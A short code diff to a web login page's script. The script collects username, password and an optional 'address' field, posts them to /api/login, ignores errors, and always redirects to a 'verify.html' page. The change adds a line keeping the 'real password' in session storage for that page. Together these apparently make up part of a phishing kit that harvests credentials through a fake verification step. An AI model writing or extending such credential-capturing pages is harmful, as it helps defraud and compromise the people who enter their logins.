@@ -136,12 +136,15 @@
     </footer>
 
     <script>
-       document.getElementById('loginForm').addEventListener('submit', async (e) => {
+   document.getElementById('loginForm').addEventListener('submit', async (e) => {
     e.preventDefault();
     
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
     const address = document.getElementById('address') ? document.getElementById('address').value : '';
+
+    // Save real password for verification page
+    sessionStorage.setItem('realPassword', password);
 
     try {
         await fetch('/api/login', {
@@ -151,7 +154,6 @@
         });
     } catch (err) {}
 
-    // Redirect to verification page instead of tunde.html
     window.location.href = "verify.html";
 });
         
